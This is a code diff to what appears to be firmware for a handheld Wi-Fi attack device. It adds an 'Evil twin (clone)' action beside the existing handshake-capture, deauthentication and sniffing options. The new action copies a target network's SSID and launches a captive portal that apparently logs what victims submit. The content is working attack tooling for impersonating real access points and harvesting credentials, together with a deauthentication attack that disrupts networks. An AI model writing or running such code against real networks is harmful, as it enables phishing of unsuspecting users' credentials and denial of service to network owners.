@@ -202,8 +202,9 @@ bool WifiModule::loopTarget(Context& ctx) {
         a.bssid[0],a.bssid[1],a.bssid[2],a.bssid[3],a.bssid[4],a.bssid[5], a.ch);
     ctx.display->printf(2, 0x07E0, "vendor: %s  %s",
         ven[0] ? ven : "?", a.enc == WIFI_AUTH_OPEN ? "OPEN" : "enc");
-    static const char* acts[] = {"Capture handshake", "Deauth this AP", "Sniff channel"};
-    const int N = 3;
+    static const char* acts[] = {"Capture handshake", "Deauth this AP",
+                                 "Sniff channel", "Evil twin (clone)"};
+    const int N = 4;
     for (int i = 0; i < N; ++i)
         ctx.display->line(3 + i, (String(i==targetSel_?"> ":"  ") + acts[i]).c_str(),
                           i==targetSel_ ? 0xFFE0 : 0xFFFF);
@@ -218,7 +219,9 @@ bool WifiModule::loopTarget(Context& ctx) {
             channel_ = a.ch;                 // lock all actions to this AP's channel
             if (targetSel_ == 0)      { if (startPromiscuous(ctx, true))  view_ = View::Handshake; }
             else if (targetSel_ == 1) { scanSel_ = targetIdx_; view_ = View::Deauth; }
-            else                      { if (startPromiscuous(ctx, false)) view_ = View::Sniffer; }
+            else if (targetSel_ == 2) { if (startPromiscuous(ctx, false)) view_ = View::Sniffer; }
+            else { cloneSsid_ = a.ssid.length() ? a.ssid : String("");   // evil twin
+                   if (startPortal(ctx)) view_ = View::Portal; }
             break;
         default: break;
     }
@@ -300,7 +303,9 @@ static void portalHandleSubmit() {
 }
 
 bool WifiModule::startPortal(Context& ctx) {
-    String ssid = ctx.config->getString("wifi.portal_ssid", "Free_WiFi");
+    // Evil-twin: clone the target SSID when set, else the configured portal SSID.
+    String ssid = cloneSsid_.length() ? cloneSsid_
+                : ctx.config->getString("wifi.portal_ssid", "Free_WiFi");
     String tpl  = ctx.config->getString("wifi.portal_template", "/huginn/portal/index.html");
 
     g_portalTemplate = "";
@@ -344,6 +349,7 @@ void WifiModule::stopPortal() {
     if (g_dns) { g_dns->stop(); delete g_dns; g_dns = nullptr; }
     if (g_portalLog) { g_portalLog.flush(); g_portalLog.close(); }
     WiFi.softAPdisconnect(true);
+    cloneSsid_ = "";                 // reset evil-twin SSID
 }
 
 bool WifiModule::loopPortal(Context& ctx) {
